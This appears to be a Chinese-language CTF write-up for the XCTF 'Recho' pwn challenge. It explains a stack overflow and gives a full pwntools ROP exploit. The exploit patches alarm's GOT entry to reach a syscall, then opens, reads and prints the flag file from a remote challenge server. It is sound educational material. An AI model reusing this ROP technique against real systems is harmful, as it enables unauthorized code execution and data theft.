# Recho


# 涉及知识

+ pwntools终止输入
+ syscall系统调用open
+ fd第一个文件为3，第二个为4

<!--more-->

# 程序分析

## 保护机制

![image.png](https://i.loli.net/2020/05/20/4hqNepXQWM6cVxu.png)

开启NX和部分RELRO

## 漏洞分析

![image.png](https://i.loli.net/2020/05/20/5ifcX6DMPGNvKhk.png)

程序逻辑很简单，就是一个简单的栈溢出。v7是任意输入的一个整型变量，其决定了读入的数据值，所以可以读入任意长度的值。

但是程序是一个死循环，只有结束了read函数后，才会跳出。ctrl + d 可以结束read函数。pwntools的shutdown('send')函数同样可以结束read函数，但是结束之后，就不能再输入payload，故我们需要一次性达到目的。

![image.png](https://i.loli.net/2020/05/20/TsSn67owYLClaxG.png)

在gdb中，给alarm打下断点，可以发现在alarm+5处有syscall系统调用可以使用。再结合flag字符串，我们很容易想到用open函数将flag文件中的值给读出来。

获得fd后，用write函数将fd中的值写入bss段中，这里选用.bss+0x500。存入.bss后，我们用printf函数或则read函数，将.bss中的内容给显示在屏幕上。

需要使用的gadget用ROPgadget来获得。

![image.png](https://i.loli.net/2020/05/20/HgrikXN59VLnWyc.png)

![image.png](https://i.loli.net/2020/05/20/EbaYKXVB1jWMRI5.png)

# EXP

````python
from pwn import *
from LibcSearcher import LibcSearcher

#sh=process('./xctf')
sh=remote('111.198.29.45',34291)
elf=ELF('./xctf')
#one gadget6
pop_rdi_ret=0x4008a3
pop_rsi_pop_r15_ret=0x4008a1 
pop_rdx_ret=0x4006fe
pop_rax_ret=0x4006fc 
add_rdi_ret=0x40070d 

flag=0x601058
alarm_got=elf.got['alarm']
alarm=elf.plt['alarm']
bss=0x601090
read=elf.plt['read']
printf=elf.plt['printf']
#make payload
payload='a'*0x38

#alarm_got=syscall
payload+=p64(pop_rdi_ret)+p64(alarm_got)
payload+=p64(pop_rax_ret)+p64(5)
payload+=p64(add_rdi_ret)

#open(flag,READONLY)
payload+=p64(pop_rdi_ret)+p64(flag)
payload+=p64(pop_rax_ret)+p64(2)
payload+=p64(pop_rdx_ret)+p64(0)
payload+=p64(pop_rsi_pop_r15_ret)+p64(0)+p64(0)
payload+=p64(alarm)

#read(flag,bss,50)
payload+=p64(pop_rdi_ret)+p64(3)
payload+=p64(pop_rsi_pop_r15_ret)+p64(bss+0x500)+p64(0)
payload+=p64(pop_rdx_ret)+p64(0x30)
payload+=p64(read)

#printf(bss)
payload+=p64(pop_rdi_ret)+p64(bss+0x500)
payload+=p64(printf)

sh.recvuntil('server!\n')
sh.sendline(str(0x200))
payload=payload.ljust(0x200,'\x00')
sh.send(payload)
sh.recv()
sh.shutdown('send')
sh.interactive()
````

# 反思

没想到syscall可以在alarm中寻找，以及将alarm_got值加5的骚操作。这道题应该算把ROP技术发挥的淋漓尽致，fd的值第一次是3，第二次是4，依次递增是一个知识盲点。

## 参考

[SCDN](https://blog.csdn.net/xidoo1234/article/details/104532070)
